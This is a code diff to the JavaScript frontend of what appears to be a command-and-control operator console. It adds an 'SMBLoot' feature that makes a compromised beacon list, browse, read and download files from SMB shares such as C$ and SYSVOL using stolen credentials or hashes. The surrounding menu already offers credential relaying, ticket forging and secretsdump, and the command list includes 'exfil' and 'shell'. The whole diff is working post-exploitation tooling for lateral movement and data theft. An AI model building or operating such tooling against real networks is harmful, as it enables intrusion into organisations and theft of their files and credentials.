@@ -3357,6 +3357,14 @@ function showImpacketMenu(btn){
   html += '<button onclick="ipkRun(\'ntlmrelayx\')">NTLMRelayx</button>';
   html += '<button onclick="ipkRun(\'smbserver\')">SMBServer (share files)</button>';
   html += '<button onclick="ipkRun(\'ticketer\')">Ticketer (golden/silver)</button>';
+  html += '<div class="nxc-section">SMBLoot (runs on beacon, no packages needed)</div>';
+  html += '<button onclick="smblootRun(\'shares\')">List Shares</button>';
+  html += '<button onclick="smblootRun(\'ls\')">Browse Share (ls)</button>';
+  html += '<button onclick="smblootRun(\'tree\')">Tree (recursive)</button>';
+  html += '<button onclick="smblootRun(\'cat\')">Read File (cat)</button>';
+  html += '<button onclick="smblootRun(\'get\')">Download File (get)</button>';
+  html += '<div class="nxc-host-pick" style="margin-top:4px"><input id="smbloot-share" placeholder="Share (e.g. C$, Users, SYSVOL)" style="width:48%;padding:3px 6px;background:var(--bg2);color:var(--text);border:1px solid var(--border);border-radius:3px;font-size:11px"><input id="smbloot-path" placeholder="Path (e.g. Windows\\System32)" style="width:48%;margin-left:4%;padding:3px 6px;background:var(--bg2);color:var(--text);border:1px solid var(--border);border-radius:3px;font-size:11px"></div>';
+  html += '<div class="nxc-note">Pure-Python SMB2 — runs directly on beacon, zero dependencies.</div>';
   html += '<div class="nxc-section">Custom</div>';
   html += '<div class="nxc-custom"><input id="ipk-custom" placeholder="e.g. secretsdump.py domain/user:pass@target" style="width:100%"><button onclick="ipkCustomRun()">Run</button></div>';
   html += '<div class="nxc-note">Runs on C2 server (not beacon). Requires Docker container.</div>';
@@ -3443,6 +3451,34 @@ async function pollServerExec(tool){
   } else {
     body.innerHTML = '<div class="t-error">'+esc(result.output||"(error)")+'</div>';
   }
+}
+
+// ── SMBLoot (beacon-side, no packages) ──
+function smblootRun(action){
+  const target = document.getElementById("ipk-target")?.value?.trim();
+  const user = document.getElementById("ipk-user")?.value?.trim();
+  const pass = document.getElementById("ipk-pass")?.value?.trim();
+  const isHash = document.getElementById("ipk-hash")?.checked;
+  if(!target||!user||!pass){ toast("warn","SMBLoot","Enter target, user, and pass/hash",3000); return; }
+  const share = document.getElementById("smbloot-share")?.value?.trim()||"";
+  const path = document.getElementById("smbloot-path")?.value?.trim()||"";
+  document.getElementById("ipk-menu")?.remove();
+  let args = target+" "+user+" "+pass;
+  if(action==="shares"){
+    args += " . shares";
+  } else if(action==="ls"){
+    args += " . ls "+(share||"C$")+(path?" "+path:"");
+  } else if(action==="tree"){
+    args += " . tree "+(share||"C$")+(path?" "+path:"");
+  } else if(action==="cat"){
+    if(!share||!path){ toast("warn","SMBLoot","Enter share and file path",3000); return; }
+    args += " . cat "+share+" "+path;
+  } else if(action==="get"){
+    if(!share||!path){ toast("warn","SMBLoot","Enter share and file path",3000); return; }
+    args += " . get "+share+" "+path;
+  }
+  toast("info","SMBLoot","Running "+action+" on "+target,4000);
+  sendCmd("smbloot "+args);
 }
 
 // ── AV/EDR Remote Enum (server-side via Impacket) ──
@@ -6854,6 +6890,7 @@ const AC_COMMANDS = [
   {cmd:"proxyinfo", hint:"Show proxy configuration", args:false},
   {cmd:"avenum", hint:"Enumerate AV/EDR/SIEM tools", args:false},
   {cmd:"loot", hint:"Loot directory (recursive zip)", args:true},
+  {cmd:"smbloot", hint:"SMB share browser (no impacket needed)", args:true},
   {cmd:"kill", hint:"Terminate beacon", args:false},
 ];
 
@@ -6867,7 +6904,7 @@ function getCompletions(text){
     return AC_COMMANDS.filter(c => c.cmd.startsWith(cmd)).map(c => ({value:c.cmd, hint:c.hint}));
   }
   const partial = parts[parts.length-1]||"";
-  const pathCmds = ["ls","cat","cd","cp","mv","rm","mkdir","chmod","download","upload","write","exfil","shell"];
+  const pathCmds = ["ls","cat","cd","cp","mv","rm","mkdir","chmod","download","upload","write","exfil","shell","smbloot"];
   if(!pathCmds.includes(cmd)) return [];
   const known = collectKnownPaths();
   return known.filter(p => p.startsWith(partial)||p.includes(partial))
